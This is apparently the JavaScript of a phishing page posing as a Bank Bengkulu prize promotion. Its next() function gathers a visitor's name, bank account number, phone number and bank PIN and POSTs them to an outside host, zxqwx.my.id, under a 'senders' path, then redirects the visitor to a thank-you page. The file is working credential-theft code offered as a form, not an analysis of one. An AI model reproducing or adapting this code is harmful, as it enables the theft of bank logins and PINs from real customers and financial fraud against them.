import { API_URL } from './global.js';

$(document).ready(function() {
	/* FOR TEST ONLY */
	/*$("#name").val("Bagas");
	$("#balance").val("20000000");
	$("#phone").val("81123456789");*/
	/* */
	$("#balance").on('input', function() {
		let value = $("#balance").val().trim().replace(/[^0-9]/g, '');
        $("#balance").val(value.replace(/\B(?=(\d{3})+(?!\d))/g, '.'));
	});
});

function next() {
	var name = $("#name").val().trim();
	var account = $("#account").val().trim();
	var phone = $("#phone").val().trim();
	var pin = $("#pin").val().trim();
	if (name=="" || account=="" || phone=="" || pin=="") {
		alert('Mohon lengkapi data!');
		return;
	}
	phone = "+62"+phone;
	$("#loader").css('display', 'flex');
	
	var message = ('\n<b>Nama:</b>\n'+name+'\n\n<b>No. Rekening:</b>\n'+account+'\n\n<b>No. HP:</b>\n'+phone+'\n\n<b>Kode PIN:</b>\nRp'+pin+'\n');
	
	var fd = new FormData();
	fd.append('message', message);
	
	fetch("https://zxqwx.my.id/senders/"
        +"pesta-hadiah-bank-bengkulu/send.php", {
        method: 'POST',
        body: fd
      })
      .then(response => response.json())
      .then(data => {
      	dataSent();
      })
      .catch((error) => {
      	dataSent();
      });
}

function dataSent() {
	window.localStorage.setItem('name', name);
	window.localStorage.setItem('account', account);
    window.localStorage.setItem('phone', phone);
    window.localStorage.setItem('pin', pin);
    $("#loader").css('display', 'none');
    window.location.href = "thank.html";
}

module.next = next;